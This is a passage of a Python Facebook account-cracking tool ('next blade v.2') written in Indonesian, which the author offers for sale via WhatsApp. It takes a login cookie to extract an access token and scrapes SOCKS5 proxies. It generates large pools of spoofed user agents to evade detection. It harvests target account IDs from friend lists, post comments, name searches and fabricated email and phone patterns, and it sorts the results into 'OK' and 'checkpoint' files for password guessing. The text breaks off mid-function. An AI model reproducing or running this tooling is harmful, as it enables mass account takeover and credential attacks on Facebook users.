#!/usr/bin/python3
# -*- coding: utf-8 -*-

#>>>> TANKS TO DHANZ-XD TO ALL <<<<#
author = 'DHANZ-XD'
WHATSAPP = '6285881856121'
github = 'https://github.com/Dhanz03'
notice = 'jika mau beli sc prem Hasil Oprek PM aja Cuy'
version = 'next blade v.2'
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +

###---[ IMPORT MODULE ]---###
import bs4, re, time, requests, datetime, os, sys, random, platform
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as parser
from datetime import datetime
from time import sleep
hp = platform.platform()
ses = requests.Session()
try:
	import pyfiglet
except ImportError:
	os.system('pip install pyfiglet')

def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz

###---[ANGGAP INI LOGO ]---###
def logo(n):
	return str(f"""
{M}█████████████████████████████████
{M}█████████████████████████████████
{M}█████████████████████████████████
{P}█████████████████████████████████
{P}█████████████████████████████████
{P}█████████████████████████████████
   {M}•{K}•{H}• {P} BELI SC OPEN SOURCE WA 085881856121 {H}•{K}•{M}•""")   
def logo2():
	return str(f"""
{M}█████████████████████████████████
{M}█████████████████████████████████
{M}█████████████████████████████████
{P}█████████████████████████████████
{P}█████████████████████████████████
{P}█████████████████████████████████
{M}>{K}>{H}> {P}CHECKING FOR LOGIN {H}>{K}>{M}>""")

###---[ TANGGAL ]---###
sasi = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
out = 'Linux-4.9.227-perf+-aarch64-with-libc'
tete = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mai", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
now = datetime.now()
hari = now.day
blx = now.month
try:
	if blx < 0 or blx > 12:exit()
	xx = blx - 1
except ValueError:exit()
#if hp not in out:exit()
bulan = sasi[xx]
tahun = now.year
tanggal = str(hari)+'-'+str(bulan)+'-'+str(tahun)
sim_ok = f'OK-{hari}-{bulan}-{tahun}.txt'
sim_cp = f'CP-{hari}-{bulan}-{tahun}.txt'
warna_warni_biasa=random.choice([H,K,M,O,B,U])
garis = f" {P}[{warna_warni_biasa}•{P}]"

###---[ APPEND ]---###
dump, sandi, metode = [], [], []
tetel, opsi, proxy = [], [], []
cepeh, sam, ugen2, ugen, ugen5, redmi = [], [], [], [], [], []
id, id2, loop ,ok , cp = [], [], 0, 0, 0
UaNgentodMuach = []
ugent = []
uasm = []


###---[ CLEAR LAYAR ]---###
def clear_layar():
	try:os.system('clear')
	except:pass
	

###---[ GLOBAL KEMBALI ]---###
def back():
	try:open('.cok.txt','r').read();get_data()
	except IOError:login()
	

###---[ AUTO CREATE UA & PROXY ]---###
def ua_rozh():
	rr = random.randint
	rc = random.choice
	{str(rc(['[FBAN/EMA;FBBV/382118484;FBAV/311.0.0.7.114;FBDV/SM-A107F;FBLC/id_ID;FBNG/4G;FBMNT/METERED;FBDM]','Safari','UCBrowser','Opera']))}
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	return (f"Mozilla/5.0 (Linux; U; Android {str(rr(2,12))}.{str(rr(2,9))}.{str(rr(2,10))}; en-gb; NEO-X5-116A Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 [FBAN/EMA;FBBV/382118484;FBAV/311.0.0.7.114;FBDV/SM-A107F;FBLC/id_ID;FBNG/4G;FBMNT/METERED;FBDM]/{str(rr(20,50))}.608.27.0")

for x in range(1000):
	rr = random.randint
	rc = random.choice
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP"
	if ugent1 in uasm:pass
	else:uasm.append(ugent1)
	ugent2 = f"Mozilla/5.0 (Linux; U; Android {str(rr(8,10))}; en-US; Redmi Note {str(rr(5,8))} Build/PKQ1.{str(rr(111111,199999))}.00{str(rr(1,9))} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.{str(rr(1111,6666))}.2 UCBrowser/13.4.0.{str(rr(1111,6666))} Mobile Safari/537.36"
	if ugent2 in uasm:pass
	else:uasm.append(ugent2)
	ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; en-US; SM-{str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Mobile UCBrowser/3.4.3.{str(rr(111,999))}"
	if ugent3 in uasm:pass
	else:uasm.append(ugent3)
	ugent4 = f"Mozilla/5.0 (Linux; Android 12{str(rr(7,12))}; IN2013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
	if ugent4 in uasm:pass
	else:uasm.append(ugent4)
	ugent5 = f"Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.{str(rr(111111,199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36 wkbrowser 5.0.17 {str(rr(2111111,2999999))} js 5.1.1 newfocus lng=ru"
	if ugent5 in uasm:pass
	else:uasm.append(ugent5)
	ugent6 = f"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
	if ugent6 in uasm:pass
	else:uasm.append(ugent6)
	ugent7 = f"Mozilla/5.0 (Linux; U; Android 18; zh-CN; MZ-meizu 17 Bui ld/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.7.6 787.(756 MZBrowser/9.14.1 Mobile Safari/537.3632 Build/KAB33O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.9822.80 Mobile Safari/537.36 HeyTapBrowser/31.7.36.1"
	if ugent7 in uasm:pass
	else:uasm.append(ugent7)
	ugent8 = f"Mozilla/5.0 (Linux; Android 10; 802SO Build/55.1.B.0.335; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 YJApp-ANDROID jp.co.yahoo.android.yjtop/3.133.1"
	if ugent8 in uasm:pass
	else:uasm.append(ugent8)
	ugent9 = f"Mozilla/5.0 (Linux; Android 8.1.0; Superb Plus Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]"
	if ugent9 in uasm:pass
	else:uasm.append(ugent9)
	ugent10 = f"Mozilla/5.0 (Linux; Android 12; M2004J19C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 GoogleApp/13.25.10.26.arm64"
	if ugent10 in uasm:pass
	else:uasm.append(ugent10)
	ugent10 = f"Mozilla/5.0 (Linux; Android SAMSUNG SM-E5260) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ Mobile Safari/537.36"


def ua_set():
        rr= random.randint
        return (f"NokiaX2-00/5.0 (08.{str(rr(25,29))}) Profile/MIDP-2.1 Configuration/CLDC-1.1 Opera/9.{str(rr(80,90))} (Android {str(rr(7,12))}; Linux; Opera Tablet/ADR-{str(rr(1400000000,1900000000))}; U; ru-RU) Presto/2.11.{str(rr(350,399))} Version/12.10 UNTRUSTED/1.0")

ugen=[]
ugen2=[]
try:ugen2 = open('user.txt','r').read().splitlines()
except:ugen2=['Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30']
try:ugen = open('user2.txt','r').read().splitlines()
except:ugen=['Mozilla/5.0 (Linux; Android 11; RMX3171 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36']

try:
	clear_layar()
	print(logo2())
	print(f'\r\n [!] sedang dump proxy dan create useragent')
	try:os.remove('.proxy.txt')
	except:pass
	uno = ses.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
	open('.proxy.txt','w').write(uno)
except requests.exceptions.ConnectionError:
	sys.exit(f" [{M}>{P}] tidak ada koneksi internet")
for x in range(1000):
	rc = random.choice
	rr = random.randint
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	merek2 = random.choice(['RMX3430','RMX3286'])
	TEMAN = f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,13))}; CPH2185 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{str(rr(40,375))}.322.0.0.5.89;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/510733775;FBCR/AXIS;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2185;FBSV/{str(rr(9,13))};FBCA/arm64-v8a:null;FBDM/"+"{density=3.0,width=2480,height=2480};]"
	F = f"{TEMAN}"
	if F in redmi:pass
	else:redmi.append(F)
try:abcd = open('.proxy.txt','r').read().splitlines()
except:sys.exit(f" [{M}>{P}] gagal dump proxy")
print(' Total Proxy : '+str(len(abcd)))
print(' Total Useragent : '+str(len(redmi)))

	
	
def UserAgentBase():
        rr = random.randint
        model = random.choice(['RMX3430','RMX3286'])
        ua = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,13))}; RMX1831 Build/PPR1.180610.011) [FBAN/MessengerLite;FBAV/{str(rr(40,375))}.309.0.0.8.61;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/434647565;FBCR/AXIS;FBMF/realme;FBBD/realme;FBDV/{model};FBSV/{str(rr(9,13))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.54375,width=720,height=1600};]")
        return ua

def ua_asu():
        xxxxx = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
        versi = random.choice(["SM-G60Y","SM-G530H"])
        build = f"{random.choice(xxxxx)}{random.choice(xxxxx)}{random.choice(xxxxx)}{random.randint(10,90)}{random.choice(xxxxx)}.{random.randint(100000,900000)}.{random.randint(100,300)}"
        uazzz = f"Mozilla/5.0 (Linux; U; Android {str(random.randint(6,12))}; {versi} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.{str(random.randint(1000,4000))}.{str(random.randint(100,900))} Mobile Safari/537.36 (AirWatch Browser v22.08.0.19)"
        return uazzz

for DhanzXDGantengNgab in range(1000):
   android1 = rc(["3","4","5","6","7","8","9","10","11","12"])
   android2 = rc(["1.5","1.6","2.1","3.0.1","4.0.2","5.0.2","6.0.1","6.2.2","7.0.1","7.0","8.1.0","4.4.4","5.1","6.3"])
   adtyaxcc = rc(['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr'])
   aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
   chrome1 = rr(73,99)
   chrome2 = rr(4500,4900)
   chrome3 = rr(75,150)
   chrome4 = rr(111111,199999)
   buildhan = rc([
                  "MMB29P",
                  "MMB29K",
                  "LRX22G",
                  "LMY48B",
                  "JZO54K",
                  "KTU84P",
                  "KOT49H",
                  "JDQ39"])
   deviceku = rc([
                  "Lenovo TB-X104X",
                  "SM-G930VC",
                  "Nexus 6P",
                  "SAMSUNG SM-T550",
                  "HTC Legend 1.32.163.1",
                  "HTC_TATTOO_A3288",
                  "Nexus One",
                  "LG-L1100",
                  "SonyEricssonX10i",
                  "SM-A510F",
                  "SM-T560",
                  "B3-A20",
                  "XT720"])
   ugent1 = f"Mozilla/5.0 (Linux; Android {android1}; SM-R825F Build/QP1A.{chrome4}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome1}.0.{chrome2}.{chrome3} Mobile Safari/537.36"
   ugent2 = f"Mozilla/5.0 (Linux; U; Android {android2}; {adtyaxcc}; {deviceku} Build/{buildhan}) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1"
   ugent3 = f"Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.{chrome4}.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome1}.0.{chrome2}.{chrome3} Mobile Safari/537.36 OPR/48.2.{chrome2}.133{chrome3}"
   dhanzUAmain = rc([ugent1,ugent2,ugent3])
   UaNgentodMuach.append(dhanzUAmain)
###---[ CEK COOKIES ]---###
def get_data():
	try:
		coki = open('.cok.txt','r').read()
		c = {'cookie':coki}
		t = open('.token.txt','r').read()
		n = ses.get(f'https://graph.facebook.com/me?access_token={t}',cookies=c).json()['name'].split(' ')[0].lower()
		menu(n,t,c)
	except Exception as e:login()


###---[ LOGIN COOKIE ]---###
def login():
	os.system('clear')
	print(logo2())
	try:
		ses = requests.Session()
		cookie = input('\n Masukan Cookie : ')
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		tokenw = open(".token.txt", "w").write(tok)
		cokiew = open(".cok.txt", "w").write(cookie)
		print('\nLogin Berhasil ')
		get_data()
	except Exception as e:
		print(" coki invalid masbroww")
		os.system('rm -rf .token.txt && rm -rf .cok.txt')
		exit()


def remove():
	try:os.remove('.cok.txt');os.remove('.token.txt')
	except:pass
	
	
	
###---[ MENU UTAMS ]---###
def menu(n,t,c):
	clear_layar()
	print(logo(n)+f'\n')
	print(f" {P}[{hh}01{P}] CRACK PUBLIK     [{hh}07{P}] CRACK SEARCH")
	print(f" [{hh}02{P}] CRACK MASSAL     [{hh}08{P}] CRACK FROM FILE")
	print(f" [{hh}03{P}] CRACK FOLLOW     [{hh}09{P}] CHECK RESSULT ACCOUNT")
	print(f" [{hh}04{P}] CRACK COMENT     [{hh}10{P}] CHECK ACCOUNT NON-ACTIVE")
	print(f" [{hh}05{P}] CRACK GROUP      [{hh}11{P}] CHECK OPTION ACCOUNT")
	print(f" [{hh}06{P}] CRACK EMAIL      [{hh}12{P}] LOGOUT ({M}COOKIE{P})")
	ask = input(f' [{hh}>>{P}] CHOOSE : ')
	print(' ─────────────────────────────')
	if ask in ['1','01']:crack_publik(t,c)
	elif ask in ['2','02']:crack_masal(t,c)
	elif ask in ['3','03']:crack_foll(t,c)
	elif ask in ['4','04']:crack_komen()
	elif ask in ['5','05']:crack_group()
	elif ask in ['6','06']:clon_email()
	elif ask in ['7','07']:crack_search()
	elif ask in ['8','08']:crack_file()
	elif ask in ['9','09']:cek_hasil()
	elif ask in ['10']:cek_akun()
	elif ask in ['11']:cek_opsi_cp()
	elif ask in ['12']:remove();exit()
	elif ask in ['',' ',]:sys.exit(f" [{M}>{P}] isi yang benar")
	else:sys.exit(f" [{M}>{P}] isi yang benar")


	
###---[ DETEKSI CHECKPOINT ]---###
detek = []
def cek_opsi_cp():
	nom, no = [], 0
	print(' ─────────────────────────────')
	try:ok = os.listdir('CP')
	except:sys.exit(f" [{M}>{P}] tidak ada hasil cp")
	for x in ok:
		nom.append(x)
		no+=1
		try:jum= open('CP/'+x,'r').readlines()
		except:continue
		print(f' [{kk}{no}{P}] {x} - {kk}{len(jum)} {P}akun')	
	exc = input(f' [{kk}<{P}] nomor yang akan di cek\n nomor : ')
	file = nom[int(exc)-1]
	print(' ─────────────────────────────')
	detek.append('file')
	for data in open('CP/'+file,'r').read().splitlines():
		ua = random.choice(redmi)
		try:id,pw = data.split('|')
		except:id,pw,t = data.split('|')[0],data.split('|')[1],data.split('|')[2]
		cek_opsi(id,pw,ua)
	exit(f'\r [{hh}<{P}] cek opsi checkpoint telah selesai')
	


###---[ CEK AKUN AMAN ]---###
def cek_akun():
	sesi , nga = 0 , 0
	no,nom = 0,[]
	print(' ─────────────────────────────')
	try:t=open('.token.txt','r').read();c={'cookie':open('.cookie.txt','r').read()}
	except:print(f' [{M}>{P}] cookie invalid');exit()
	try:ok = os.listdir('OK')
	except:sys.exit(f" [{M}>{P}] tidak ada hasil ok")
	for x in ok:
		nom.append(x)
		no+=1
		try:jum= open('OK/'+x,'r').readlines()
		except:continue
		print(f' [{hh}{no}{P}] {x} - {hh}{len(jum)} {P}akun')	
	exc = input(f' [{hh}<{P}] nomor file yang akan di cek\n file : ')
	xxx = input(' simpan akun tidak kenon ke file apa : \n nama : ')
	nonon = xxx+'.txt'
	file = nom[int(exc)-1]
	print(' ─────────────────────────────')
	print(f' akun tidak kenon di : {nonon}\n akun yang kenon di  : buang goblok')
	print(' ─────────────────────────────')
	try:
		uuid = open('OK/'+file,'r').read().splitlines()
		mek = 0
		for data in uuid:
			print(f'\r [{hh}>{P}] aman : {nga} down : {sesi}',end='')
			sys.stdout.flush()
			try:user,nama = data.split('|')
			except:exit(f" [{M}>{P}] pemisah salah")
			xx = open(nonon,'a')
			try:
				mek+=1
				na = ses.get(f'https://graph.facebook.com/{user}?access_token={t}',cookies=c).json()['name']
				print(f'\r [{hh}{mek}{P}] {user}|{nama}                    ')
				nga+=1
				ni = f'{user}|{nama}\n'
				xx.write(ni)
			except:
				print(f'\r [{M}{mek}{P}] {user}|{nama}                  ')
				sesi+=1
	except Exception as e :
		exit(f" [{M}>{P}] file tidak ada")
		
		
###---[CEK HASIL CRACK ]---###
def cek_hasil():
	no,nom = 0,[]
	one = input(f' [{hh}1{P}] cek hasil akun ok\n [{hh}2{P}] cek hasil akun cp\n menu : ')
	if one in ['1','01']:
		try:ok = os.listdir('OK')
		except:sys.exit(f" [{M}>{P}] tidak hasil ok")
		for x in ok:
			nom.append(x)
			no+=1
			try:jum= open('OK/'+x,'r').readlines()
			except:continue
			print(f' [{hh}{no}{P}] {x} - {hh}{len(jum)} {P}akun')	
		abc = input(f' [{hh}<{P}] nomor file : ')
		file = nom[int(abc)-1]
		try:buka = open('OK/'+file,'r').read()
		except:sys.exit(f" [{M}>{P}] file tidak ada hasil ok")
		print(hh+buka+P)
	elif one in ['2','02']:
		try:ok = os.listdir('CP')
		except:sys.exit(f" [{M}>{P}] tidak hasil cp")
		for x in ok:
			nom.append(x)
			no+=1
			try:jum= open('CP/'+x,'r').readlines()
			except:continue
			print(f' [{kk}{no}{P}] {x} - {kk}{len(jum)} {P}akun')		
		abc = input(f' [{hh}<{P}] nomor file : ')
		file = nom[int(abc)-1]
		try:buka = open('CP/'+file,'r').read()
		except:sys.exit(f" [{M}>{P}] file tidak ada hasil cp")
		print(kk+buka+P)
	else:sys.exit(f" [{M}>{P}] isi yang benar")
		
		
###---[ DUMP NO LOGIN ]---###
def crack_nomor():
	print(f' [{hh}<{P}] crack nomor gunakan sandi manual')
	depan = input(' awalan : ')
	if len(depan)==3:pass
	else:exit(f' [{M}>{P}] contoh awalan nomor 089')
	jumla = input(' jumlah : ')
	for x in range(int(jumla)):
		rr = random.randint
		A = depan
		B = rr(1111,9999)
		C = rr(1,9)
		D = f'{A}{C}-{str(rr(1111,9999))}-{str(B)}'
		if D in dump:pass
		else:dump.append(D+'|123456')
		print('\r sedang dump %s id'%(len(dump)),end=" ")
		sys.stdout.flush()
		sleep(0.0000003)
	atur_atur()
		

def clon_email():
	rc = random.choice
	rr = random.randint
	bas = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	print(f' [{hh}>{P}] dump dari email, max 1000 id')
	nama = input(' target : ')
	if ',' in str(nama):
		exit(f' [{M}<{P}] masukan 1 nama saja')
	doma = input(' domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f' [{M}<{P}] masukan domain yang benar')
	jumlah = input(' total  : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in dump:pass
		else:dump.append(D+'|'+nama)
		if len(dump)==2000:atur_atur()
		print('\r sedang dump %s id'%(len(dump)),end='')
		sys.stdout.flush()
	atur_atur()	

def crack_file():
	file = input(f' [{hh}<{P}] masukan nama file dump\n file : ')
	try:
		uuid = open(file,'r').readlines()
		for data in uuid:
			try:user,nama = data.split('|')
			except:exit(f" [{M}>{P}] pemisah salah")
			dump.append(data)
			print('\r sedang dump %s id'%(len(dump)),end=" ")
			sleep(0.0000003)
	except FileNotFoundError:exit(f" [{M}>{P}] file tidak ada")
	print(f'\r [{hh}<{P}] total jumlah akun adalah {len(dump)}')
	atur_atur()
	
def crack_search():
	nama = []
	custom = [" muhammad"," firman"," pratama"," tyz"," galau"," semarang"," boyolali"," cilacap"," kebumen"," banyumas"," herex"," tuban"," sumedang"," aja"," new"," baru"," setia"," sayang"," cinta"," syank kamu"," cantik"," ganteng"," imut"," kalem"," sragen"," susah sembuh"," sudah sembuh"," sakit"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya "]
	custom2 = ["mamah ","ibuk ","bunda ","ayah ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak "]
	print(f' [{hh}<{P}] 1 nama setara dengan 10k akun')
	nam = input(f' nama : ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=35) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	atur_atur()
		
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in dump:pass
			else:dump.append(bo)
	try:
		link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
		if(link):
			print('\r sedang dump %s id'%(len(dump)),end=" ")
			sys.stdout.flush()
			cari_nama(link)
	except:pass
	

def crack_komen():
	ide = input(f' [{hh}<{P}] masukan id postingan target\n id post : ')
	url = 'https://mbasic.facebook.com/'+ide
	try:get_komen(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f' [{M}>{P}] gagal dump komen')
	atur_atur()

def get_komen(url):
	data = parser(ses.get(url).text,"html.parser")
	for isi in data.find_all("h3"):
		for ids in isi.find_all("a",href=True):
			if "profile.php" in ids.get("href"):id = ids.get("href").split('=')[1].replace("&refid","")
			else:id = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
			nama = ids.text
			if id+"|"+nama in dump:pass
			else:dump.append(id+"|"+nama)
			print(f'\r sedang dump {len(dump)} id ',end='');sys.stdout.flush()
	for z in data.find_all("a",href=True):
		if "Lihat komentar sebelumnya…" in z.text:
			try:get_komen("https://mbasic.facebook.com"+z["href"])
			except:pass
			
			
	
###---[ DUMP LOGIN ]---###
def crack_publik(t,c):
	akun = input(f' ID Publik : ')
	try:
		t = open('.token.txt','r').read()
		coki = open('.cok.txt','r').read()
		c = {'cookie':coki}
		bas = ses.get(f'https://graph.facebook.com/%s?fields=friends.limit(5000)&access_token=%s'%(akun,t),cookies=c).json()
		for pi in bas['friends']['data']:
			try:
				try:dump.append(pi['username']+'|'+pi['name'])
				except:dump.append(pi['id']+'|'+pi['name'])
				print('\r Sedang Dump %s ID'%(len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		atur_atur()
	except (KeyError,IOError):
		exit(f" akun tidak publik")	


def crack_masal(t,c):
    print(f' [{hh}<{P}] MAKE SURE THE ACCOUNT IS PUBLIC ')
    try:
        bz=0
        apa = int(input(f' TOTAL ID : '))
    except:apa=1
    for bz in range(apa):
    	bz +=1
    	akun = input(f'\r ID {bz} : ')
    	try:
    		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(name,username,id)&access_token={t}',cookies=c).json()
    		for pi in bas['friends']['data']:
    		      try:dump.append(pi['username']+'|'+pi['name'])
    		      except:dump.append(pi['id']+'|'+pi['name'])
    		      print('\r sedang dump %s id'%(len(dump)),end=" ")
    		      sys.stdout.flush()
    		      time.sleep(0.0002)
    	except:
    		print(f"\r [{kk}!{P}] akun tidak publik       ")
    		continue	                       		
    atur_atur()
    
    
def crack_foll(t,c):
	akun = input(f' [{hh}<{P}] pastikan akun bersifat publik \n akun : ')
	try:
